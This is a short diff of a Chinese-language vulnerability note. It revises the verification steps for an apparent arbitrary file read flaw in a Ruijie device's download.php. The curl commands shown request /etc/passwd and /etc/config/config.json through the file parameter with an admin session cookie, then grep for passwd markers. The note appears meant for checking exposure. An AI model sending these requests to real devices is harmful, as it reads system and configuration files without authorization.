@@ -53,11 +53,10 @@ curl "http://target/download.php?a=read_txt&file=/etc/config/config.json" -b "RU
 ## 验证方法
 
 ```bash
-# 检查响应中是否包含文件内容
-curl -s "http://target/download.php?a=read_txt&file=/etc/passwd" -b "RUIJIEID=SESSION_ID;user=admin;" | grep "root:"
-
-# 检查响应是否为有效 JSON（非错误页面）
-curl -s -o /dev/null -w "%{http_code}" "http://target/download.php?a=read_txt&file=/etc/passwd" -b "RUIJIEID=SESSION_ID;user=admin;"
+# 检查响应体里是不是 passwd 文件内容
+curl -s "http://target/download.php?a=read_txt&file=/etc/passwd" -b "RUIJIEID=SESSION_ID;user=admin;" | grep "root:x:0:0"
+# 判据：响应体出现 root:x:0:0（及后续的 shell 字段）这类 /etc/passwd 特征串
+# 反例：响应体是错误页、登录页或只有 JSON 状态字段，不含文件内容，即未命中
 ```
 
 ## 指纹确认
